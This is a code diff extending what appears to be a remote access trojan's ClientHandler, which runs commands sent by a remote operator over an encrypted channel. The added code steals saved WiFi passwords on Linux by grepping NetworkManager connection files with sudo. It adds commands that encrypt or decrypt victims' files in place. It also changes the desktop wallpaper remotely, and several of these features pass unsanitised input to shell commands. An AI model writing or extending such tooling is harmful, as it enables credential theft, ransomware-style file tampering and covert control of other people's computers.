@@ -136,6 +136,37 @@ class ClientHandler:
             file.close()
             print("\nFile sent successfully.")
 
+    def encrypt_file(self , filename):
+        current_path =  os.path.abspath(os.getcwd())
+        file_path = os.path.join(current_path,filename)
+        try:
+            with open(file_path,"rb") as file:
+                data = file.read()
+            file.close()
+            data = encrypt(data)
+            with open(file_path,"wb") as file:
+                file.write(data)
+            file.close()
+            self.send(encrypt(b"File encrypted successfully"))
+        except Exception as e:
+            self.send(encrypt(f"Error encrypting file: {e}".encode()))
+    
+    def decrypt_file(self , filename):
+        current_path =  os.path.abspath(os.getcwd())
+        file_path = os.path.join(current_path,filename)
+        try:
+            with open(file_path,"rb") as file:
+                data = file.read()
+            file.close()
+            data = decrypt(data)
+            with open(file_path,"wb") as file:
+                file.write(data)
+            file.close()
+            self.send(encrypt(b"File decrypted successfully"))
+        except Exception as e:
+            self.send(encrypt(f"Error decrypting file: {e}".encode()))
+                
+
     def authenticate(self, valid_user="test", valid_pass="test") -> bool:
         logged_in = False
         counter = 0
@@ -221,7 +252,13 @@ class ClientHandler:
                     if os_name=="Windows":
                         result = subprocess.run(command, shell=True, capture_output=True, text=True).stdout
                     else:
-                        result = "Still unavailable on linux"
+                        command = f"sudo grep -r '^psk=' /etc/NetworkManager/system-connections/ | grep -i '{wifi_network}'"
+                        try:
+                            result = subprocess.run(command, shell=True, capture_output=True, text=True).stdout
+                            if not result:
+                                result = f"No password found for network: {wifi_network}"
+                        except:
+                            result = "Failed to retrieve WiFi password. May need sudo privileges."
                     self.send_data(result.encode())                    
 
                 elif cmd.startswith("del "):
@@ -259,8 +296,28 @@ class ClientHandler:
                         self.send(encrypt(b"1"))
                         self.send(result)
                     else:
-                        self.send(encrypt(b'1'))
-                        self.send(b'This operation is not supported on this OS.')
+                        try:
+                            filename = cmd.split(" ", 1)[1]
+                            filepath = os.path.join(os.getcwd(), filename)
+                            command = f"gsettings set org.gnome.desktop.background picture-uri file://{filepath}"
+                            result = subprocess.run(command, shell=True, capture_output=True, text=True)
+                            if result.returncode == 0:
+                                self.send(encrypt(b"1"))
+                                self.send(encrypt(b"Wallpaper changed successfully"))
+                            else:
+                                self.send(encrypt(b"1")) 
+                                self.send(encrypt(b"Failed to change wallpaper - command failed"))
+                        except Exception as e:
+                            self.send(encrypt(b"1"))
+                            self.send(encrypt(f"Failed to change wallpaper: {str(e)}".encode()))
+                
+                elif cmd.startswith("encrypt "):
+                    file_name = decrypt(self.recv()).decode()
+                    self.encrypt_file(file_name)        
+
+                elif cmd.startswith("decrypt "):
+                    file_name = decrypt(self.recv()).decode()
+                    self.decrypt_file(file_name)          
 
                 else:
                     self.send(encrypt(b"Unknown command"))
